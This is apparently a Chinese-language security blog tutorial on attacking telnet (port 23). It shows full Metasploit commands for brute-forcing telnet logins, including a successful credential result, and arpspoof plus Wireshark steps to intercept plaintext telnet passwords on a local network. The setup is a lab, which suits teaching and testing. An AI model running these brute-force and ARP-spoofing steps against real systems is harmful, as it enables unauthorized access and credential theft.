---
layout:     post
title:      "23端口漏洞利用"
subtitle:   "简单介绍了Metasploit的使用"
date:       2020-03-26
author:     "Malcolm Suen"
header-img: "img/post-bg-2015.jpg"
header-mask:  0.3
catalog: true
tags:
    - 高危端口
    - 漏洞利用
    - Inspur
---

## Metasploit暴破telnet

终端输入命令

```shell
msfconsole

msf5 > search telnet

Matching Modules
================

   #   Name                                                               Disclosure Date  Rank       Check  Description
   -   ----                                                               ---------------  ----       -----  -----------
   # 找到对应模块
   9   auxiliary/scanner/telnet/telnet_login                                               normal     No     Telnet Login Check Scanner


msf5 > use auxiliary/scanner/telnet/telnet_login 
msf5 auxiliary(scanner/telnet/telnet_login) > show options 

Module options (auxiliary/scanner/telnet/telnet_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             23               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
   # 通过show options发现，需要设置PASS_FILE、USER_FILE、（USERPASS_FILE）、RHOSTS几个参数

msf5 auxiliary(scanner/telnet/telnet_login) > set rhosts 10.10.4.123
rhosts => 10.10.4.123
msf5 auxiliary(scanner/telnet/telnet_login) > set USER_FILE dic_username_telnet.txt
USER_FILE => dic_username_telnet.txt
msf5 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE dic_password_telnet.txt
PASS_FILE => dic_password_telnet.txt
msf5 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true		# 成功时停止

msf5 auxiliary(scanner/telnet/telnet_login) > run
#	爆破成功
[+] 10.10.4.123:23        - 10.10.4.123:23 - Login Successful: admin:admin12345
```

## Wireshark嗅探抓取telnet明文账户密码

Wireshark是一个网络封包分析软件。网络封包分析软件的功能是抓取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。

我们可以利用arpspoof拦截转发同一网段下其他用户流量，再使用Wireshark来分析查看流量。

使用Wireshark抓取信息需要确保三台机器在同一网段下，虚拟机Alice使用telnet登录虚拟机Bob时，攻击端可以抓取明文密码。

使用arpspoof开启流量转发，别人的流量经过此处也可转发出去。Kali Linux上可能没有arpspoof，使用`apt-get install dsniff`进行安装（arpspoof是dsniff的一个工具）。

```shell
cat /proc/sys/net/ipv4/ip_forward	#查看转发是否开启，0为关闭，1为开启，一般Kali Linux默认开启。
```

开启转发后，使用arpspoof转发流量：

```shell
arpspoof -i eth0 -t 192.168.109.128 192.168.109.0
# arpspoof -i 网卡 -t [target IP] 网关
```

打开Wireshark进行抓包，输入过滤规则：

```shell
ip.addr==目标IP && tcp.port==23
```

![](/img/in-post/2020-03-26/01.png)

> 参考资料：
>
> [Wireshark嗅探抓取telnet明文账户密码](https://www.cnblogs.com/MyGuazi/p/11852981.html)











